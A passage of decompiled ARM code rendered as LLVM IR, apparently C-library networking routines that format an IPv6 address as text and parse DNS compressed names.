  store i32 %v5_15fe4, i32* %v3_15ffc, align 4
  %v7_16000 = icmp sgt i32 %v1_15fec, 15
  br i1 %v7_16000, label %dec_label_pc_16004, label %dec_label_pc_15fd4.dec_label_pc_15fd4_crit_edge

dec_label_pc_15fd4.dec_label_pc_15fd4_crit_edge:  ; preds = %dec_label_pc_15fd4
  %v0_15fd4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15fd4

dec_label_pc_16004:                               ; preds = %dec_label_pc_15fd4
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1601c

dec_label_pc_1601c:                               ; preds = %dec_label_pc_16004, %dec_label_pc_16068
  %v0_1605c = phi i32 [ -1, %dec_label_pc_16004 ], [ %v0_16090, %dec_label_pc_16068 ]
  %v0_1604c = phi i32 [ -1, %dec_label_pc_16004 ], [ %v0_1607c, %dec_label_pc_16068 ]
  %v0_16030 = phi i32 [ -1, %dec_label_pc_16004 ], [ %v0_160307, %dec_label_pc_16068 ]
  %v0_16068 = phi i32 [ 0, %dec_label_pc_16004 ], [ %v1_16068, %dec_label_pc_16068 ]
  store i32 %v2_15ff0, i32* @lr, align 4
  %v4_16020 = mul nuw nsw i32 %v0_16068, 4
  %v5_16020 = add i32 %v4_16020, %v2_15ff0
  %v1_16024 = add i32 %v5_16020, -32
  %v2_16024 = inttoptr i32 %v1_16024 to i32*
  %v3_16024 = load i32, i32* %v2_16024, align 4
  %v2_16028 = icmp eq i32 %v3_16024, 0
  %v7_16030 = icmp eq i32 %v0_16030, -1
  br i1 %v2_16028, label %dec_label_pc_16030, label %dec_label_pc_16044

dec_label_pc_16030:                               ; preds = %dec_label_pc_1601c
  br i1 %v7_16030, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16030
  store i32 %v0_16068, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_16068

.thread:                                          ; preds = %dec_label_pc_16030
  %v1_1603c.pre = load i32, i32* @r4, align 4
  %v2_1603c = add i32 %v1_1603c.pre, 1
  store i32 %v2_1603c, i32* @r4, align 4
  br label %dec_label_pc_16068

dec_label_pc_16044:                               ; preds = %dec_label_pc_1601c
  br i1 %v7_16030, label %dec_label_pc_16068, label %dec_label_pc_1604c

dec_label_pc_1604c:                               ; preds = %dec_label_pc_16044
  %v7_1604c = icmp eq i32 %v0_1604c, -1
  %v0_16060.pre = load i32, i32* @r4, align 4
  %v1_16054 = load i32, i32* @r7, align 4
  %v7_16058 = icmp sgt i32 %v0_16060.pre, %v1_16054
  %or.cond = or i1 %v7_1604c, %v7_16058
  br i1 %or.cond, label %dec_label_pc_1605c, label %dec_label_pc_16064

dec_label_pc_1605c:                               ; preds = %dec_label_pc_1604c
  store i32 %v0_1605c, i32* @r6, align 4
  store i32 %v0_16060.pre, i32* @r7, align 4
  br label %dec_label_pc_16064

dec_label_pc_16064:                               ; preds = %dec_label_pc_1604c, %dec_label_pc_1605c
  %v0_1604c12 = phi i32 [ %v0_1605c, %dec_label_pc_1605c ], [ %v0_1604c, %dec_label_pc_1604c ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16068

dec_label_pc_16068:                               ; preds = %bb, %.thread, %dec_label_pc_16044, %dec_label_pc_16064
  %v0_16090 = phi i32 [ %v0_1605c, %.thread ], [ %v0_16068, %bb ], [ %v0_1605c, %dec_label_pc_16044 ], [ -1, %dec_label_pc_16064 ]
  %v0_160307 = phi i32 [ %v0_16030, %.thread ], [ %v0_16068, %bb ], [ -1, %dec_label_pc_16044 ], [ -1, %dec_label_pc_16064 ]
  %v0_1607c = phi i32 [ %v0_1604c, %.thread ], [ %v0_1604c, %bb ], [ %v0_1604c, %dec_label_pc_16044 ], [ %v0_1604c12, %dec_label_pc_16064 ]
  %v1_16068 = add nuw nsw i32 %v0_16068, 1
  %v7_16070 = icmp slt i32 %v1_16068, 8
  br i1 %v7_16070, label %dec_label_pc_1601c, label %dec_label_pc_16074

dec_label_pc_16074:                               ; preds = %dec_label_pc_16068
  %v7_16074 = icmp eq i32 %v0_16090, -1
  store i1 %v7_16074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16074, label %dec_label_pc_16074.dec_label_pc_16094_crit_edge, label %dec_label_pc_1607c

dec_label_pc_16074.dec_label_pc_16094_crit_edge:  ; preds = %dec_label_pc_16074
  %v1_160b8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16094

dec_label_pc_1607c:                               ; preds = %dec_label_pc_16074
  %v7_1607c = icmp eq i32 %v0_1607c, -1
  store i1 %v7_1607c, i1* %cpsr_z.global-to-local, align 1
  %v0_1608c.pre = load i32, i32* @r4, align 4
  br i1 %v7_1607c, label %dec_label_pc_1608c, label %dec_label_pc_16084

dec_label_pc_16084:                               ; preds = %dec_label_pc_1607c
  %v1_16084 = load i32, i32* @r7, align 4
  %v9_16084 = icmp eq i32 %v0_1608c.pre, %v1_16084
  store i1 %v9_16084, i1* %cpsr_z.global-to-local, align 1
  %v7_16088 = icmp sgt i32 %v0_1608c.pre, %v1_16084
  br i1 %v7_16088, label %dec_label_pc_1608c, label %dec_label_pc_16094

dec_label_pc_1608c:                               ; preds = %dec_label_pc_1607c, %dec_label_pc_16084
  store i32 %v0_1608c.pre, i32* @r7, align 4
  store i32 %v0_16090, i32* @r6, align 4
  br label %dec_label_pc_16094

dec_label_pc_16094:                               ; preds = %dec_label_pc_16074.dec_label_pc_16094_crit_edge, %dec_label_pc_16084, %dec_label_pc_1608c
  %v1_160b8.pre = phi i32 [ %v1_16084, %dec_label_pc_16084 ], [ %v1_160b8.pre.pre, %dec_label_pc_16074.dec_label_pc_16094_crit_edge ], [ %v0_1608c.pre, %dec_label_pc_1608c ]
  %v0_16094 = phi i32 [ %v0_1607c, %dec_label_pc_16084 ], [ %v0_1607c, %dec_label_pc_16074.dec_label_pc_16094_crit_edge ], [ %v0_16090, %dec_label_pc_1608c ]
  %v7_16094 = icmp eq i32 %v0_16094, -1
  store i1 %v7_16094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16094, label %dec_label_pc_16094._crit_edge, label %dec_label_pc_1609c

dec_label_pc_1609c:                               ; preds = %dec_label_pc_16094
  %v7_1609c = icmp eq i32 %v1_160b8.pre, 1
  store i1 %v7_1609c, i1* %cpsr_z.global-to-local, align 1
  %v7_160a0 = icmp slt i32 %v1_160b8.pre, 2
  br i1 %v7_160a0, label %bb54, label %dec_label_pc_16094._crit_edge

bb54:                                             ; preds = %dec_label_pc_1609c
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_16094._crit_edge

dec_label_pc_16094._crit_edge:                    ; preds = %dec_label_pc_16094, %dec_label_pc_1609c, %bb54
  %v0_160b8 = phi i32 [ %v0_16094, %dec_label_pc_1609c ], [ -1, %bb54 ], [ %v0_16094, %dec_label_pc_16094 ]
  %v2_160a8 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_160a8, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1aa20.643 to i32), i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_160b8 = add i32 %v0_160b8, %v1_160b8.pre
  store i32 %v2_160b8, i32* @sl, align 4
  %v9_16118 = icmp eq i32 %tmp, 65535
  %v7_160c068 = icmp eq i32 %v0_160b8, -1
  store i1 %v7_160c068, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_160c0

dec_label_pc_160c0:                               ; preds = %dec_label_pc_16094._crit_edge, %dec_label_pc_16170
  %v7_160c072 = phi i1 [ %v7_160c068, %dec_label_pc_16094._crit_edge ], [ %v7_160c0, %dec_label_pc_16170 ]
  %v0_160ec71 = phi i32 [ 0, %dec_label_pc_16094._crit_edge ], [ %v1_16170, %dec_label_pc_16170 ]
  %v1_160d870 = phi i32 [ %v0_160b8, %dec_label_pc_16094._crit_edge ], [ %v0_160c0.pre, %dec_label_pc_16170 ]
  %v2_160f069 = phi i32 [ %v2_160a8, %dec_label_pc_16094._crit_edge ], [ %v3_160dc29, %dec_label_pc_16170 ]
  br i1 %v7_160c072, label %dec_label_pc_160e4, label %dec_label_pc_160c8

dec_label_pc_160c8:                               ; preds = %dec_label_pc_160c0
  %v9_160c8 = icmp eq i32 %v0_160ec71, %v1_160d870
  store i1 %v9_160c8, i1* %cpsr_z.global-to-local, align 1
  %v5_160cc = icmp slt i32 %v0_160ec71, %v1_160d870
  br i1 %v5_160cc, label %dec_label_pc_160e4, label %dec_label_pc_160d0

dec_label_pc_160d0:                               ; preds = %dec_label_pc_160c8
  %v1_160d0 = load i32, i32* @sl, align 4
  %v9_160d0 = icmp eq i32 %v0_160ec71, %v1_160d0
  store i1 %v9_160d0, i1* %cpsr_z.global-to-local, align 1
  %v6_160d4 = icmp slt i32 %v0_160ec71, %v1_160d0
  br i1 %v6_160d4, label %dec_label_pc_160d8, label %dec_label_pc_160e4

dec_label_pc_160d8:                               ; preds = %dec_label_pc_160d0
  store i1 %v9_160c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_160c8, label %bb56, label %dec_label_pc_16170

bb56:                                             ; preds = %dec_label_pc_160d8
  %v1_160dc = load i32, i32* @sb, align 4
  %v2_160dc = trunc i32 %v1_160dc to i8
  %v4_160dc = inttoptr i32 %v2_160f069 to i8*
  store i8 %v2_160dc, i8* %v4_160dc, align 1
  %v5_160dc = load i32, i32* @r4, align 4
  %v6_160dc = add i32 %v5_160dc, 1
  store i32 %v6_160dc, i32* @r4, align 4
  br label %dec_label_pc_16170

dec_label_pc_160e4:                               ; preds = %dec_label_pc_160d0, %dec_label_pc_160c8, %dec_label_pc_160c0
  %v2_160e4 = icmp eq i32 %v0_160ec71, 0
  store i1 %v2_160e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_160e4, label %dec_label_pc_16154, label %dec_label_pc_160ec

dec_label_pc_160ec:                               ; preds = %dec_label_pc_160e4
  %v7_160ec = icmp eq i32 %v0_160ec71, 6
  store i1 %v7_160ec, i1* %cpsr_z.global-to-local, align 1
  %v0_160f0 = load i32, i32* @sb, align 4
  %v1_160f0 = trunc i32 %v0_160f0 to i8
  %v3_160f0 = inttoptr i32 %v2_160f069 to i8*
  store i8 %v1_160f0, i8* %v3_160f0, align 1
  %v4_160f0 = load i32, i32* @r4, align 4
  %v5_160f0 = add i32 %v4_160f0, 1
  store i32 %v5_160f0, i32* @r4, align 4
  %v0_160f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_160f4, label %dec_label_pc_160f8, label %dec_label_pc_16154

dec_label_pc_160f8:                               ; preds = %dec_label_pc_160ec
  %v0_160f8 = load i32, i32* @r6, align 4
  %v2_160f8 = icmp eq i32 %v0_160f8, 0
  store i1 %v2_160f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_160f8, label %dec_label_pc_16100, label %dec_label_pc_16154

dec_label_pc_16100:                               ; preds = %dec_label_pc_160f8
  %v0_16100 = load i32, i32* @r7, align 4
  %v7_16100 = icmp eq i32 %v0_16100, 6
  store i1 %v7_16100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16100, label %dec_label_pc_16120, label %dec_label_pc_16108

dec_label_pc_16108:                               ; preds = %dec_label_pc_16100
  %v7_16108 = icmp eq i32 %v0_16100, 5
  store i1 %v7_16108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16108, label %dec_label_pc_16110, label %dec_label_pc_16154

dec_label_pc_16110:                               ; preds = %dec_label_pc_16108
  store i1 %v9_16118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16118, label %dec_label_pc_16120, label %dec_label_pc_16154

dec_label_pc_16120:                               ; preds = %dec_label_pc_16110, %dec_label_pc_16100
  %v2_16124 = sub i32 %v2_15ff0, %v5_160f0
  %v1_16128 = add i32 %v2_16124, -32
  store i32 %v1_16128, i32* %r2.global-to-local, align 4
  %v0_1612c = load i32, i32* @r8, align 4
  %v1_1612c = add i32 %v0_1612c, 12
  store i32 %v1_1612c, i32* %r0.global-to-local, align 4
  %v3_16134 = call i32 @function_15e38(i32 %v1_1612c, i32 %v5_160f0, i32 %v1_16128)
  store i32 %v3_16134, i32* %r0.global-to-local, align 4
  %v2_16138 = icmp eq i32 %v3_16134, 0
  store i1 %v2_16138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16138, label %bb57, label %dec_label_pc_16144

bb57:                                             ; preds = %dec_label_pc_16120
  %v1_1613c = load i32, i32* @r6, align 4
  store i32 %v1_1613c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_161e4

dec_label_pc_16144:                               ; preds = %dec_label_pc_16120
  %v0_16144 = load i32, i32* @r4, align 4
  store i32 %v0_16144, i32* @r0, align 4
  %v0_16148 = call i32 @function_f2e0()
  store i32 %v0_16148, i32* %r0.global-to-local, align 4
  %v0_1614c = load i32, i32* @r4, align 4
  %v2_1614c = add i32 %v0_1614c, %v0_16148
  store i32 %v2_1614c, i32* @r4, align 4
  %v0_16184.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16184

dec_label_pc_16154:                               ; preds = %dec_label_pc_16110, %dec_label_pc_16108, %dec_label_pc_160f8, %dec_label_pc_160ec, %dec_label_pc_160e4
  %v0_1615c = phi i32 [ %v5_160f0, %dec_label_pc_16110 ], [ %v5_160f0, %dec_label_pc_16108 ], [ %v5_160f0, %dec_label_pc_160f8 ], [ %v5_160f0, %dec_label_pc_160ec ], [ %v2_160f069, %dec_label_pc_160e4 ]
  store i32 %v2_15ff0, i32* @lr, align 4
  %v1_16158 = load i32, i32* @r5, align 4
  %v4_16158 = mul i32 %v1_16158, 4
  %v5_16158 = add i32 %v4_16158, %v2_15ff0
  store i32 %v0_1615c, i32* @r0, align 4
  %v1_16160 = add i32 %v5_16158, -32
  %v2_16160 = inttoptr i32 %v1_16160 to i32*
  %v3_16160 = load i32, i32* %v2_16160, align 4
  store i32 %v3_16160, i32* %r2.global-to-local, align 4
  %v0_16164 = load i32, i32* @fp, align 4
  %v5_16168 = call i32 @function_d01c(i32 %v0_1615c, i32 %v0_16164, i32 %v3_16160, i32 %v5_16158)
  store i32 %v5_16168, i32* %r0.global-to-local, align 4
  %v0_1616c = load i32, i32* @r4, align 4
  %v2_1616c = add i32 %v0_1616c, %v5_16168
  store i32 %v2_1616c, i32* @r4, align 4
  br label %dec_label_pc_16170

dec_label_pc_16170:                               ; preds = %bb56, %dec_label_pc_160d8, %dec_label_pc_16154
  %v3_160dc29 = phi i32 [ %v6_160dc, %bb56 ], [ %v2_160f069, %dec_label_pc_160d8 ], [ %v2_1616c, %dec_label_pc_16154 ]
  %v0_16170 = load i32, i32* @r5, align 4
  %v1_16170 = add i32 %v0_16170, 1
  store i32 %v1_16170, i32* @r5, align 4
  %v0_160c0.pre = load i32, i32* @r6, align 4
  %v7_16178 = icmp slt i32 %v1_16170, 8
  %v7_160c0 = icmp eq i32 %v0_160c0.pre, -1
  store i1 %v7_160c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16178, label %dec_label_pc_160c0, label %dec_label_pc_1617c

dec_label_pc_1617c:                               ; preds = %dec_label_pc_16170
  br i1 %v7_160c0, label %.thread2, label %dec_label_pc_16184

dec_label_pc_16184:                               ; preds = %dec_label_pc_1617c, %dec_label_pc_16144
  %v3_16190 = phi i32 [ %v3_160dc29, %dec_label_pc_1617c ], [ %v2_1614c, %dec_label_pc_16144 ]
  %v0_16184 = phi i32 [ %v0_160c0.pre, %dec_label_pc_1617c ], [ %v0_16184.pre, %dec_label_pc_16144 ]
  %v1_16184 = load i32, i32* @r7, align 4
  %v2_16184 = add i32 %v1_16184, %v0_16184
  %v7_16188 = icmp eq i32 %v2_16184, 8
  store i1 %v7_16188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16188, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_16184
  %v4_16190 = inttoptr i32 %v3_16190 to i8*
  store i8 58, i8* %v4_16190, align 1
  %v5_16190 = load i32, i32* @r4, align 4
  %v6_16190 = add i32 %v5_16190, 1
  store i32 %v6_16190, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16184, %dec_label_pc_1617c, %bb58
  %v2_16198 = phi i32 [ %v3_16190, %dec_label_pc_16184 ], [ %v3_160dc29, %dec_label_pc_1617c ], [ %v6_16190, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_16198 = inttoptr i32 %v2_16198 to i8*
  store i8 0, i8* %v3_16198, align 1
  %v4_16198 = load i32, i32* @r4, align 4
  %v5_16198 = add i32 %v4_16198, 1
  store i32 %v2_160a8, i32* @r1, align 4
  %v2_161a0 = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_161a0, i32* %r2.global-to-local, align 4
  %v2_161a4 = sub i32 %v5_16198, %v2_160a8
  %v9_161a8 = icmp eq i32 %v2_161a4, %v2_161a0
  store i1 %v9_161a8, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_161a4, %v2_161a0
  br i1 %tmp75, label %dec_label_pc_161b0, label %dec_label_pc_161c4

dec_label_pc_161b0:                               ; preds = %.thread2
  %v0_161b0 = call i32 @function_ce08()
  store i32 %v0_161b0, i32* %r0.global-to-local, align 4
  %v0_161b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_161b8, i32* %r2.global-to-local, align 4
  %v2_161bc = inttoptr i32 %v0_161b0 to i32*
  store i32 28, i32* %v2_161bc, align 4
  %v0_161e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_161e4

dec_label_pc_161c4:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_161c8 = inttoptr i32 %arg3 to i8*
  %v3_161c8 = call i32 @function_f53c(i8* %v2_161c8, i32 %v2_160a8)
  br label %dec_label_pc_161cc

dec_label_pc_161cc:                               ; preds = %dec_label_pc_15fac, %dec_label_pc_161c4
  %storemerge = phi i32 [ %v3_15fb8, %dec_label_pc_15fac ], [ %v3_161c8, %dec_label_pc_161c4 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_161e4

dec_label_pc_161d4:                               ; preds = %dec_label_pc_15fa0
  %v0_161d4 = call i32 @function_ce08()
  store i32 %v0_161d4, i32* %r0.global-to-local, align 4
  %v2_161dc = inttoptr i32 %v0_161d4 to i32*
  store i32 97, i32* %v2_161dc, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_161e4

dec_label_pc_161e4:                               ; preds = %bb57, %dec_label_pc_161cc, %dec_label_pc_161b0, %dec_label_pc_161d4
  %v0_161e4 = phi i32 [ %v1_1613c, %bb57 ], [ %storemerge, %dec_label_pc_161cc ], [ %v0_161e4.pre, %dec_label_pc_161b0 ], [ 0, %dec_label_pc_161d4 ]
  store i32 %v0_161e4, i32* %r0.global-to-local, align 4
  store i32 %v6_15f7c, i32* %r5.global-to-local, align 4
  ret i32 %v0_161e4

; uselistorder directives
  uselistorder i32 %v0_161e4, { 1, 0 }
  uselistorder i1 %v7_160c0, { 2, 0, 1 }
  uselistorder i32 %v0_160c0.pre, { 1, 0, 2 }
  uselistorder i32 %v1_16170, { 0, 2, 1 }
  uselistorder i32 %v0_1615c, { 1, 0 }
  uselistorder i32 %v5_160f0, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_160c8, { 1, 0, 2 }
  uselistorder i32 %v2_160f069, { 0, 3, 2, 1 }
  uselistorder i32 %v0_160ec71, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_160c068, { 1, 0 }
  uselistorder i32 %v2_160a8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_160b8, { 1, 0, 2 }
  uselistorder i1 %v7_16094, { 1, 0 }
  uselistorder i32 %v0_16094, { 1, 2, 0 }
  uselistorder i32 %v1_160b8.pre, { 2, 0, 1 }
  uselistorder i32 %v0_1608c.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_1607c, { 1, 0 }
  uselistorder i1 %v7_16074, { 1, 0 }
  uselistorder i32 %v1_16068, { 1, 0 }
  uselistorder i32 %v0_1607c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16090, { 1, 2, 0, 3 }
  uselistorder i1 %v7_16030, { 1, 0 }
  uselistorder i32 %v0_16068, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1604c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1605c, { 3, 1, 0, 2 }
  uselistorder i32 %v1_15fec, { 1, 0, 2 }
  uselistorder i32 %v2_15fd4, { 1, 0 }
  uselistorder i32 %v0_15fec, { 3, 1, 0, 2 }
  uselistorder i32 %v2_15ff0, { 0, 4, 3, 1, 5, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 5, 6, 7, 12, 8, 9, 10, 11, 14, 13, 15, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 22, 14, 15, 16, 17, 18, 23, 19, 20, 21 }
  uselistorder i32 97, { 2, 3, 4, 1, 0, 5 }
  uselistorder i8 58, { 0, 3, 4, 1, 5, 6, 7, 2, 8, 9 }
  uselistorder i32 (i32, i32, i32, i32)* @function_d01c, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_15e38, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_161e4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_161cc, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16170, { 2, 0, 1 }
  uselistorder label %dec_label_pc_160c0, { 1, 0 }
  uselistorder label %dec_label_pc_16094._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16094, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1608c, { 1, 0 }
  uselistorder label %dec_label_pc_16068, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16064, { 1, 0 }
  uselistorder label %dec_label_pc_1601c, { 1, 0 }
}

define i32 @function_16200(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_16200:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_16200 = load i32, i32* @r5, align 4
  %v0_16204 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16204, i32* %sl.global-to-local, align 4
  %v2_16204 = icmp eq i32 %v0_16204, 0
  br i1 %v2_16204, label %.thread30, label %dec_label_pc_1622c.preheader

.thread30:                                        ; preds = %dec_label_pc_16200
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_162ec

dec_label_pc_1622c.preheader:                     ; preds = %dec_label_pc_16200
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1622c4 = load i32, i32* @r1, align 4
  %v6_1623014 = icmp slt i32 %v0_1622c4, %arg2
  br i1 %v6_1623014, label %dec_label_pc_16234.preheader, label %dec_label_pc_162ec

dec_label_pc_16234.preheader:                     ; preds = %dec_label_pc_1622c.preheader
  %v2_1623451 = add i32 %v0_16204, %v0_1622c4
  %v3_1623452 = inttoptr i32 %v2_1623451 to i8*
  %v4_1623453 = load i8, i8* %v3_1623452, align 1
  %v6_1623454 = zext i8 %v4_1623453 to i32
  store i32 %v6_1623454, i32* @r4, align 4
  %v2_1623855 = icmp eq i8 %v4_1623453, 0
  br i1 %v2_1623855, label %bb49, label %dec_label_pc_16240

dec_label_pc_16228:                               ; preds = %bb48, %bb44
  %v1_1622c = phi i32 [ %v1_1622c.pre, %bb48 ], [ %v1_1625859, %bb44 ]
  %v0_1622c = phi i32 [ %v0_1622c.pre, %bb48 ], [ %v5_16270, %bb44 ]
  %v0_16228 = phi i32 [ %v0_16228.pre, %bb48 ], [ %v0_1627460, %bb44 ]
  store i32 %v0_16228, i32* %r0.global-to-local, align 4
  %v6_16230 = icmp slt i32 %v0_1622c, %v1_1622c
  br i1 %v6_16230, label %dec_label_pc_16228.dec_label_pc_16234_crit_edge, label %dec_label_pc_162ec

dec_label_pc_16228.dec_label_pc_16234_crit_edge:  ; preds = %dec_label_pc_16228
  %v0_16234.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_16234 = add i32 %v0_16234.pre, %v0_1622c
  %v3_16234 = inttoptr i32 %v2_16234 to i8*
  %v4_16234 = load i8, i8* %v3_16234, align 1
  %v6_16234 = zext i8 %v4_16234 to i32
  store i32 %v6_16234, i32* @r4, align 4
  %v2_16238 = icmp eq i8 %v4_16234, 0
  %v0_162d8 = load i32, i32* @ip, align 4
  %v2_162d8 = icmp eq i32 %v0_162d8, 0
  br i1 %v2_16238, label %dec_label_pc_162d8, label %dec_label_pc_16240

dec_label_pc_16240:                               ; preds = %dec_label_pc_16234.preheader, %dec_label_pc_16228.dec_label_pc_16234_crit_edge
  %v2_162d866 = phi i1 [ %v2_162d8, %dec_label_pc_16228.dec_label_pc_16234_crit_edge ], [ false, %dec_label_pc_16234.preheader ]
  %v0_162d864 = phi i32 [ %v0_162d8, %dec_label_pc_16228.dec_label_pc_16234_crit_edge ], [ 1, %dec_label_pc_16234.preheader ]
  %v6_1623463 = phi i32 [ %v6_16234, %dec_label_pc_16228.dec_label_pc_16234_crit_edge ], [ %v6_1623454, %dec_label_pc_16234.preheader ]
  %v0_1626062 = phi i32 [ %v0_16234.pre, %dec_label_pc_16228.dec_label_pc_16234_crit_edge ], [ %v0_16204, %dec_label_pc_16234.preheader ]
  %v0_1625061 = phi i32 [ %v0_1622c, %dec_label_pc_16228.dec_label_pc_16234_crit_edge ], [ %v0_1622c4, %dec_label_pc_16234.preheader ]
  %v0_1627460 = phi i32 [ %v0_16228, %dec_label_pc_16228.dec_label_pc_16234_crit_edge ], [ 0, %dec_label_pc_16234.preheader ]
  %v1_1625859 = phi i32 [ %v1_1622c, %dec_label_pc_16228.dec_label_pc_16234_crit_edge ], [ %arg2, %dec_label_pc_16234.preheader ]
  %v1_16244 = and i32 %v6_1623463, 192
  br i1 %v2_162d866, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_16240
  %v1_16248 = load i32, i32* %r8.global-to-local, align 4
  %v2_16248 = add i32 %v1_16248, 1
  store i32 %v2_16248, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_16240, %bb
  %v2_1624c = icmp eq i32 %v1_16244, 192
  %v1_16250 = add i32 %v0_1625061, 1
  store i32 %v1_16250, i32* %r1.global-to-local, align 4
  br i1 %v2_1624c, label %dec_label_pc_16258, label %dec_label_pc_16280

dec_label_pc_16258:                               ; preds = %bb42
  %v6_1625c = icmp slt i32 %v1_16250, %v1_1625859
  br i1 %v6_1625c, label %dec_label_pc_16260, label %dec_label_pc_162ec

dec_label_pc_16260:                               ; preds = %dec_label_pc_16258
  %v2_16260 = add i32 %v1_16250, %v0_1626062
  %v3_16260 = inttoptr i32 %v2_16260 to i8*
  %v4_16260 = load i8, i8* %v3_16260, align 1
  %v6_16260 = zext i8 %v4_16260 to i32
  %v1_16268 = urem i32 %v6_1623463, 64
  br i1 %v2_162d866, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_16260
  %v1_1626c = load i32, i32* %r8.global-to-local, align 4
  %v2_1626c = add i32 %v1_1626c, 1
  store i32 %v2_1626c, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_16260, %bb43
  %v4_16270 = mul nuw nsw i32 %v1_16268, 256
  %v5_16270 = or i32 %v6_16260, %v4_16270
  store i32 %v5_16270, i32* %r1.global-to-local, align 4
  store i32 %v0_1627460, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_16228

dec_label_pc_16280:                               ; preds = %bb42
  %v2_16280 = add i32 %v6_1623463, %v0_1627460
  store i32 %v2_16280, i32* %r6.global-to-local, align 4
  %v3_16284 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16284, i32* @r3, align 4
  %v1_16288 = add i32 %v2_16280, 1
  store i32 %v1_16288, i32* %r7.global-to-local, align 4
  %v3_1628c = icmp ult i32 %v1_16288, %v3_16284
  br i1 %v3_1628c, label %dec_label_pc_16294, label %dec_label_pc_162ec

dec_label_pc_16294:                               ; preds = %dec_label_pc_16280
  %v2_16294 = add i32 %v6_1623463, %v1_16250
  store i32 %v2_16294, i32* @r5, align 4
  %v3_16298 = icmp ult i32 %v2_16294, %v1_1625859
  br i1 %v3_16298, label %dec_label_pc_162a0, label %dec_label_pc_162ec

